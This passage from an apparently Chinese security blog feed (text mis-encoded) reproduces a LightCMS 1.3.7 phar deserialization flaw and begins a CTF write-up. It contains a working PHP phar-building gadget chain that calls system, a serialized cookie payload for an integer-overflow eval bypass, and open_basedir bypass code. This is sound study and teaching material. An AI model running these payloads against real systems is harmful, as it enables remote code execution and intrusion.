class="hljs-string">                    return $this-&gt;prepareResponse(</span><br><span class="hljs-string">                        $request,</span><br><span class="hljs-string">                        $route-&gt;run($request); //runæ§åˆ¶å™¨</span><br><span class="hljs-string">                    );</span><br><span class="hljs-string">                &#125;);</span><br><span class="hljs-string">    &#125;</span><br></code></pre></div></td></tr></table></figure><h2 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h2>]]></content>
    
    
    <categories>
      
      <category>laravel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LightCMS1.3.7æ¼æ´å¤ç°</title>
    <link href="/2021/07/02/2021-7-2-LightCMS1.3.7/"/>
    <url>/2021/07/02/2021-7-2-LightCMS1.3.7/</url>
    
    <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p><code>lightCMS</code>æ˜¯ä¸€ä¸ªè½»é‡çº§çš„<code>CMS</code>ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªé€šç”¨çš„åå°ç®¡ç†æ¡†æ¶ä½¿ç”¨ã€‚<code>lightCMS</code>é›†æˆäº†ç”¨æˆ·ç®¡ç†ã€æƒé™ç®¡ç†ã€æ—¥å¿—ç®¡ç†ã€èœå•ç®¡ç†ç­‰åå°ç®¡ç†æ¡†æ¶çš„é€šç”¨åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿæä¾›æ¨¡å‹ç®¡ç†ã€åˆ†ç±»ç®¡ç†ç­‰<code>CMS</code>ç³»ç»Ÿä¸­å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p><h5 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h5><figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> /var/www/html<br>git clone https://hub.fastgit.org/eddy8/LightCMS.git<br><span class="hljs-built_in">cd</span> lightCMS<br>composer install<br>sudo chmod <span class="hljs-number">777</span> -R storage/ bootstrap/cache/<br>cp .env.example .env<br><br>æ•°æ®åº“é…ç½®ï¼š<br>CREATE DATABASE homestead;<br>CREATE USER &#x27;homestead&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;secret&#x27;;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;homestead&#x27;@&#x27;localhost&#x27;;<br>FLUSH PRIVILEGES;<br><br>php artisan migrate --seed<br>php artisan serve <br><br>é€”ä¸­å¯èƒ½å›é‡åˆ°ä¸€äº›php-mysqlä¾èµ–æ²¡æœ‰å®‰è£…ï¼Œ<br>sudo apt-get install php7.<span class="hljs-number">4</span>-xsl php7.<span class="hljs-number">4</span>-mbstring php7.<span class="hljs-number">4</span>-intl -y php7.<span class="hljs-number">4</span>-gdå¯¹åº”ä½ è‡ªå·±çš„å®‰è£…å³å¯<br></code></pre></div></td></tr></table></figure><p>laravelæ¡†æ¶å±å®è¿˜æ²¡å­¦æ˜ç™½ï¼Œåªèƒ½ç…§ç€ç½‘ä¸Šçš„å¤ç°ï¼Œè¿™ä¸ªæ¼æ´å‡ºåœ¨ <code>app/Http/Controllers/Admin/NEditorController.php</code>ä¸­çš„ä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210704175218866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çŸ¥é“æ¼æ´å‘ç”Ÿåœ¨å“ªäº†ï¼Œæˆ‘è‡ªå·±å…ˆåˆ†æäº†ä¸‹è¿™ä¸²ä»£ç ï¼Œ</p><blockquote><p>å…³äºconfigå‡½æ•°config å‡½æ•°</p><p>å¦‚æœæˆ‘è¦çš„é…ç½®ä¸åœ¨.env æ–‡ä»¶ä¸­è€Œåœ¨ mail.php æ–‡ä»¶ä¸­ï¼Œæˆ‘è¦ä¸´æ—¶è®¾ç½®å’Œè¯»å–è¯¥æ€ä¹ˆåŠï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦ä½¿ç”¨ config å‡½æ•°äº†ï¼Œè¿™ä¸ªå‡½æ•°åœ¨ä½¿ç”¨ä¸Šæœ‰äº›ç‰¹è‰²ï¼Œæˆ‘ä»¬ä¸€ä¸€è¯´ã€‚</p><p>æ¯”å¦‚æˆ‘ç°åœ¨è¦è¯»å– mail.php æ–‡ä»¶ä¸­çš„ driver é…ç½®é¡¹ï¼Œå¯ä»¥ä½¿ç”¨ config(â€˜mail.driverâ€™), å¦‚æœè¦è·å– mail.php æ–‡ä»¶ä¸­æ‰€æœ‰çš„é…ç½®é¡¹å¯ä»¥ä½¿ç”¨ config(â€˜mailâ€™)ï¼Œæ³¨æ„ä¸¤ç§æ–¹å¼çš„åŒºåˆ«ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³ä¸´æ—¶çš„ä¿®æ”¹é…ç½®ï¼Œä½†æ˜¯åˆä¸åƒè®©å®ƒç”Ÿæ•ˆï¼Œå¯ä»¥ä½¿ç”¨ config([â€˜mail.driverâ€™=&gt;â€™sendmailâ€™])ï¼Œè¿™æ ·é‚®ç®±é…ç½®ä¸­çš„é©±åŠ¨é…ç½®å°±æ”¹ä¸ºäº† sendmailï¼Œä¸è¿‡è¿™ç§æ–¹å¼æ˜¯ä¸´æ—¶çš„ï¼Œå¹¶ä¸ä¼šå†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚</p><p>å…ˆç”¨è¿‡æ»¤å™¨è¿‡æ»¤å˜é‡ï¼Œåˆå§‹åŒ–curlè¯æŸ„æ¥è·å–è¿œç¨‹èµ„æºçš„å†…å®¹ï¼Œç„¶åä½¿ç”¨ Image:make æ¨¡å—è¿›è¡Œè§£æç”¨imagecreatefromwebpè·å¾—çš„WebP å›¾åƒæ–‡ä»¶ï¼Œ</p><table><thead><tr><th align="center"><strong>æ–‡ä»¶åç§°</strong></th><th align="right"><strong>é…ç½®ç±»å‹</strong></th></tr></thead><tbody><tr><td align="center">app.php</td><td align="right">åº”ç”¨ç›¸å…³ï¼Œå¦‚é¡¹ç›®åç§°ã€æ—¶åŒºã€è¯­è¨€ç­‰</td></tr><tr><td align="center">auth.php</td><td align="right">ç”¨æˆ·æˆæƒï¼Œå¦‚ç”¨æˆ·ç™»å½•ã€å¯†ç é‡ç½®ç­‰</td></tr><tr><td align="center">broadcasting.php</td><td align="right">äº‹ä»¶å¹¿æ’­ç³»ç»Ÿç›¸å…³é…ç½®</td></tr><tr><td align="center">cache.php</td><td align="right">ç¼“å­˜ç›¸å…³é…ç½®</td></tr><tr><td align="center">database.php</td><td align="right">æ•°æ®åº“ç›¸å…³é…ç½®ï¼ŒåŒ…æ‹¬ MySQLã€Redis ç­‰</td></tr><tr><td align="center">filesystems.php</td><td align="right">æ–‡ä»¶å­˜å‚¨ç›¸å…³é…ç½®</td></tr><tr><td align="center">mail.php</td><td align="right">é‚®ç®±å‘é€ç›¸å…³çš„é…ç½®</td></tr><tr><td align="center">queue.php</td><td align="right">é˜Ÿåˆ—ç³»ç»Ÿç›¸å…³é…ç½®</td></tr><tr><td align="center">services.php</td><td align="right">æ”¾ç½®ç¬¬ä¸‰æ–¹æœåŠ¡é…ç½®</td></tr><tr><td align="center">session.php</td><td align="right">ç”¨æˆ·ä¼šè¯ç›¸å…³é…ç½®</td></tr><tr><td align="center">view.php</td><td align="right">è§†å›¾å­˜å‚¨è·¯å¾„ç›¸å…³é…ç½®</td></tr></tbody></table></blockquote><p><img src="https://img-blog.csdnimg.cn/20210704175147723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œconfigå‡½æ•°è¯»å–light.image_upload.driverçš„å€¼ï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯ä¸Šä¼ åˆ°æœ¬åœ°ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±è·å–classç„¶åå®ä¾‹åŒ–ï¼Œå›è°ƒcatchImageå‡½æ•°</p><p>ç„¶åè·å–è¯·æ±‚ç»“æœï¼Œè½¬æ¢ä¸ºæ•°ç»„å»é‡ï¼Œæ¥ç€éå†æ•°ç»„ï¼Œéšåè·Ÿè¿›fetch Image Fileå‡½æ•°</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20210703021425786.png" alt="image-20210703021425786"></p><p>å¯ä»¥çœ‹åˆ°å…ˆç”¨è¿‡æ»¤å™¨çœ‹æ˜¯å¦<code>$url</code>æ˜¯å¦æ˜¯<code>url</code>ã€‚æ³¨æ„è¿™ä¸ä»…httpåè®®å¯ä»¥é€šè¿‡ï¼Œå…¶å®ƒå¦‚pharåè®®åŒæ ·ä¹Ÿå¯ä»¥ã€‚æ¥ç€å°è¯• curl è®¿é—® urlï¼Œå¹¶è¿”å›ç»“æœç»™<code>$data</code>ï¼Œç„¶åé€šè¿‡<code>isWebp()</code>åˆ¤æ–­<code>$data</code>æ˜¯å¦æ˜¯ webp æ–‡ä»¶ï¼Œå…¶ä¸­ä¼šè°ƒç”¨<code>Intervention\\Image\\Facades\\Image</code>çš„ makeæ–¹æ³•ï¼Œå¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œè§£æ</p><p>é€æ­¥è·Ÿè¿›<code>vendor/intervention/image/src/Intervention/Image/ImageManager.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171304422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»§ç»­è·Ÿè¿›åˆ°<code>vendor/intervention/image/src/intervention/Image/AbstractDriver.php</code>ï¼Œé€šè¿‡ <code>init()</code>ï¼Œç„¶åä¼ å…¥ <code>decoder-&gt;init()</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171404901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›initåˆ°<code>vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210704175114220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹ <code>isUlr()</code> æ–¹æ³•ï¼ŒåŒæ ·ä¹Ÿæ˜¯åˆ¤æ–­<code>$data</code>æ˜¯å¦ä¸º urlï¼Œè¿™æ—¶<code>$data</code>æ˜¯ phar åè®®ï¼Œå¯ä»¥ return trueï¼Œæ‰€ä»¥ <code>$data</code>ä¼ å…¥<code>initFromUrl()</code></p><p><img src="https://img-blog.csdnimg.cn/20210703171548952.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹<code>initFromUrl()</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ° <code>file_get_contents()</code> è§¦å‘ phar ååºåˆ—åŒ–</p><p><img src="https://img-blog.csdnimg.cn/20210703171738283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>expå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>&#123; //åˆ›å»ºä¸€ä¸ªäº‹ä»¶å¹¶å°†æ•°ç»„ä¸­çš„äº‹ä»¶ï¼ˆé”®ï¼‰å’Œäº‹ä»¶ç›‘å¬è€…ï¼ˆæ•°ç»„çš„é”®å€¼ï¼‰è¿›è¡Œç»‘å®š<br>    <span class="hljs-title">protected</span> $<span class="hljs-title">events</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$evnet</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-keyword">new</span> Dispatcher(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;events = <span class="hljs-variable">$events</span>;<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Events</span>&#123;<br>        <br>        <span class="hljs-title">class</span> <span class="hljs-title">Dispatcher</span>&#123;  //è§¦å‘äº‹ä»¶ç±»<br>            <span class="hljs-title">protected</span> $<span class="hljs-title">listeners</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;listeners=[<span class="hljs-variable">$event</span>=&gt;[<span class="hljs-string">&#x27;system&#x27;</span>]];<br>            &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    $phar = new Phar(&#x27;phar.phar&#x27;);  //åç¼€åå¿…é¡»ä¸ºphar<br>    <span class="hljs-variable">$phar</span> -&gt; startBuffering();<br>    <span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$o</span>));<br>    <span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$o</span>);   <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ </span><br>   <span class="hljs-variable">$phar</span> -&gt; stopBuffering();  <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>å…·ä½“çš„laraveläº‹ä»¶æœºåˆ¶å¯ä»¥çœ‹çœ‹</p><p>[]: <a href="https://blog.csdn.net/qq_16877261/article/details/79095039?utm_source=blogxgwz0">https://blog.csdn.net/qq_16877261/article/details/79095039?utm_source=blogxgwz0</a></p><p><img src="https://img-blog.csdnimg.cn/20210704173030893.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20210704173050552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€ååœ¨å‘åŒ…å³å¯</p><p><img src="https://img-blog.csdnimg.cn/20210704175044902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>LightCMS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>LightCMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>one_Pointer_php</title>
    <link href="/2021/06/03/2021-6-3-%E8%93%9D%E5%B8%BDweb/"/>
    <url>/2021/06/03/2021-6-3-%E8%93%9D%E5%B8%BDweb/</url>
    
    <content type="html"><![CDATA[<h2 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h2><h3 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h3><ul><li>åˆ©ç”¨æ•´æ•°æº¢å‡ºè·å–webshell</li><li>open_basedirçš„ç»•è¿‡</li><li>disable_functionç»•è¿‡ï¼ˆä¼ªé€ FastCGIè¯·æ±‚PHP-CGIï¼‰</li><li>æ¶æ„ftpæœåŠ¡ç›´æ¥æ‰“</li></ul><p>é¢˜ç›®ç»™äº†æºç ï¼Œä¸¤ä¸ªphpæ–‡ä»¶ï¼Œä»£ç æ¯”è¾ƒç®€å•ï¼Œéœ€è¦ç»•è¿‡$count[]=1è¿›å…¥åˆ°evalå‘½ä»¤æ‰§è¡Œ</p><h4 id="php-æ•´æ•°æº¢å‡º"><a href="#php-æ•´æ•°æº¢å‡º" class="headerlink" title="php æ•´æ•°æº¢å‡º"></a>php æ•´æ•°æº¢å‡º</h4><blockquote><p>åœ¨ PHP ä¸­ï¼Œæ•´å‹æ•°æ˜¯æœ‰ä¸€ä¸ªèŒƒå›´çš„ï¼Œå¯¹äº32ä½çš„æ“ä½œç³»ç»Ÿï¼Œæœ€å¤§çš„æ•´å‹æ˜¯2147483647ï¼Œå³2çš„31æ¬¡æ–¹ï¼Œæœ€å°ä¸º-2çš„31æ¬¡æ–¹ã€‚å¦‚æœç»™å®šçš„ä¸€ä¸ªæ•´æ•°è¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰çš„èŒƒå›´ï¼Œå°†ä¼šè¢«è§£é‡Šä¸ºæµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚åŒæ ·å¦‚æœæ‰§è¡Œçš„è¿ç®—ç»“æœè¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰èŒƒå›´ï¼Œä¹Ÿä¼šè¿”å›æµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚</p></blockquote><p>åˆ™å¯ä»¥åˆ©ç”¨å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$userconut</span> = <span class="hljs-number">9223372036854775806</span>;<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$userconut</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$count</span>[]=<span class="hljs-number">1</span>;<br>print_r(<span class="hljs-variable">$count</span>);<br></code></pre></div></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">PHP Warning:  Cannot add element to the <span class="hljs-keyword">array</span> <span class="hljs-keyword">as</span> the next element is already occupied in C:\Users\LiuSir\Desktop\www\index.php on line <span class="hljs-number">4</span><br><br>Warning: Cannot add element to the <span class="hljs-keyword">array</span> <span class="hljs-keyword">as</span> the next element is already occupied in C:\Users\LiuSir\Desktop\www\index.php on line <span class="hljs-number">4</span><br><span class="hljs-keyword">Array</span><br>(<br>    [<span class="hljs-number">9223372036854775807</span>] =&gt; <span class="hljs-number">1</span><br>)<br>[Finished in <span class="hljs-number">0.2</span>s]<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»£ç æŠ¥é”™äº†ã€‚è¿™æ˜¯å› ä¸ºå…ˆè®©</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$user</span>-&gt;count ä¸º PHP_INT_MAX - <span class="hljs-number">1</span>ï¼Œ<br></code></pre></div></td></tr></table></figure><p>è‡ªå¢ä¹‹åï¼Œæ•°ç»„ count çš„æœ€å¤§é”®ä¸º PHP_INT_MAXï¼Œæ­¤æ—¶ $count[]=1ï¼Œæ–°é”®ç­‰äºæ•°ç»„çš„æœ€å¤§é”®+1ï¼Œé”®å€¼ä¸º1ï¼Œè¿™é‡Œé”®ä¸º PHP_INT_MAX + 1ï¼Œå¯¼è‡´æŠ¥é”™ï¼Œè¿”å›å€¼ä¸º0ï¼Œç„¶åå°±å¯ä»¥æˆåŠŸç»•è¿‡å¹¶è¿›å…¥åˆ° eval() ä¸­äº†ã€‚</p><p>æ‹¿åˆ°urlç¼–ç åçš„åºåˆ—åŒ–æ•°æ®ï¼Œæ”¹cookieå³å¯è¿›è¡Œevalæ‰§è¡Œå‘½ä»¤</p><blockquote><p>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</p></blockquote><p>å‘ç°disable_function<br><img src="https://img-blog.csdnimg.cn/20210603151340468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>open_basedir<br><img src="https://img-blog.csdnimg.cn/20210603151416151.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="ç»•è¿‡open-basedir"><a href="#ç»•è¿‡open-basedir" class="headerlink" title="ç»•è¿‡open_basedir"></a>ç»•è¿‡open_basedir</h4><ul><li>ini_setç»•è¿‡ç»•è¿‡<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">mkdir(<span class="hljs-string">&#x27;z33&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;z33&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br>chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></div></td></tr></table></figure>æˆ–è€…globåè®®ç»•è¿‡<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br>sort(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></li></ul><p>ç»“æœå¦‚ä¸‹<br><img src="https://img-blog.csdnimg.cn/20210603151756833.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ ¹ç›®å½•é‡Œå‘ç°äº† flagã€‚</p><p>å°è¯•ä½¿ç”¨ file_get_contents() ç­‰å‡½æ•°è¯»å–å‡å¤±è´¥ï¼ŒçŒœæµ‹æ˜¯å‡ºé¢˜äººå¯¹flagçš„æƒé™åšäº†é™åˆ¶ã€‚é‚£æˆ‘ä»¬å°±è¦æƒ³åŠæ³•ææƒäº†ï¼Œä½†æ˜¯è¦ææƒåˆ™å¿…é¡»å…ˆæ‹¿åˆ° Shell æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯å¾—è¦å…ˆç»•è¿‡ disable_functionsã€‚</p><p>è¯»å–/proc/self/cmdlineå‘ç°è¿›ç¨‹æ—¶php-fpm: pool wwwã€‚çŒœæµ‹åº”è¯¥æ˜¯æ”»å‡»php-fpmæ¥ç»•è¿‡disable_functionsã€‚åˆ™å…ˆè¯»å–nginxé…ç½®æ–‡ä»¶/etc/nginx/nginx.confå‘ç°æœ‰å‘ç°æœ‰</p><blockquote><p>include /etc/nginx/sites-enabled/*</p><ul><li>sites_availables æŒ‡çš„æ˜¯æ‰€æœ‰ nginx ç«™ç‚¹ï¼›</li><li>sites_enabled æŒ‡çš„æ˜¯å½“å‰å¼€å¯çš„ nginx ç«™ç‚¹ï¼›</li></ul></blockquote><p>å†æ¥ç€è¯»/etc/nginx/sites-enabled/defaultï¼Œå‘ç°</p><p><img 